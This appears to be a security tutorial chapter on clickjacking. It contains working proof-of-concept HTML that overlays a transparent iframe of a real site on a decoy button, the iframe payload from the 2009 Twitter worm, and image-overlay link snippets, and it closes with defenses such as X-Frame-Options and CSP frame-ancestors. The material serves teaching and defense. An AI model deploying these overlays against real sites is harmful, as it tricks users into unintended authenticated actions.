# 28 - Clickjacking: UI Redressing Attacks

## What Is Clickjacking?

Clickjacking tricks users into clicking something different from what they perceive. The attacker overlays a transparent or disguised element over a visible decoy, so the user's click hits the hidden target.

## Classic Clickjacking: Transparent Iframe Overlay

```html
<!DOCTYPE html>
<html>
<head>
    <title>CLICK JACK!!!</title>
    <style>
    iframe {
        width: 900px;
        height: 250px;

        /* Use absolute positioning to line up target button with fake button */
        position: absolute;
        top: -195px;
        left: -740px;
        z-index: 2;

        /* Hide from view */
        -moz-opacity: 0.5;
        opacity: 0.5;
        filter: alpha(opacity=0.5);
    }

    button {
        position: absolute;
        top: 10px;
        left: 10px;
        z-index: 1;
        width: 120px;
    }
    </style>
</head>
<body>
    <iframe src="http://www.qidian.com" scrolling="no"></iframe>
    <button>CLICK HERE!</button>
</body>
</html>
```

### How It Works

**The CSS is the key:**

```css
iframe {
    position: absolute;
    top: -195px;
    left: -740px;     /* Offset to align the target button */
    z-index: 2;        /* ABOVE the visible button */

    opacity: 0.5;      /* Semi-transparent (0 in real attack) */
    filter: alpha(opacity=0.5);  /* IE compatibility */
}
```

1. **The iframe loads the target site** (`qidian.com`) — the victim's real, authenticated session
2. **Absolute positioning + negative offsets** move the iframe so that a specific button on the target site lines up exactly over the fake "CLICK HERE!" button
3. **`z-index: 2`** places the iframe **above** the visible button (`z-index: 1`) — clicks hit the iframe first
4. **`opacity: 0`** (or near-zero) makes the iframe invisible — the user only sees the fake button underneath
5. When the user clicks "CLICK HERE!", they actually click the real button inside the iframe, performing an authenticated action on the target site

In the example, `opacity: 0.5` is used for demonstration — in a real attack it would be `0` (fully invisible).

## Twitter Clickjacking (2009 "Don't Click" Worm)

```html
<iframe scrolling="no"
    src="http://twitter.com/home?status=Yes, I did click the button!!!(WHAT!!??)">
</iframe>
```

Twitter's tweet form pre-filled the status from the URL parameter. The attacker:
1. Embedded Twitter in a transparent iframe with the status pre-filled
2. Positioned the "Tweet" button under a fake button
3. Users clicked and unknowingly posted the tweet
4. The tweet contained a link to the clickjacking page → **self-propagating worm**

## CSRF via Visual Deception (Image Overlay)

Clickjacking doesn't always require iframes. Attackers can overlay positioned images to create fake UI:

### Example 1: Overlaid Link with Image

```html
<a href="http://disenchant.ch">
<img src="http://disenchant.ch/powered.jpg"
     style="position:absolute; right:320px; top:90px;" />
</a>
```

### Example 2: Fake Profile Picture as Link

```html
</table>
<a href="http://www.ph4nt0m.org">
<img src="http://img.baidu.com/hi/img/portraitn.jpg"
     style="position:absolute; left:123px; top:123px;">
</a>
```

These use `position:absolute` to place a clickable image over an existing UI element. The user sees what looks like a normal part of the page but clicks through to the attacker's site. This can be injected via:
- User-controlled HTML fields (profiles, comments) that allow `<img>` with `style`
- Stored XSS with limited tag injection

## Defenses Against Clickjacking

| Defense | How It Works |
|---------|-------------|
| **`X-Frame-Options: DENY`** | Browser refuses to render the page in any iframe |
| **`X-Frame-Options: SAMEORIGIN`** | Only allows framing by pages on the same origin |
| **CSP `frame-ancestors`** | Modern replacement: `Content-Security-Policy: frame-ancestors 'none'` |
| **Frame-busting JavaScript** | `if (top !== self) top.location = self.location;` — but can be bypassed |

`X-Frame-Options` or CSP `frame-ancestors` are the reliable defenses — they are enforced by the browser before any content renders.
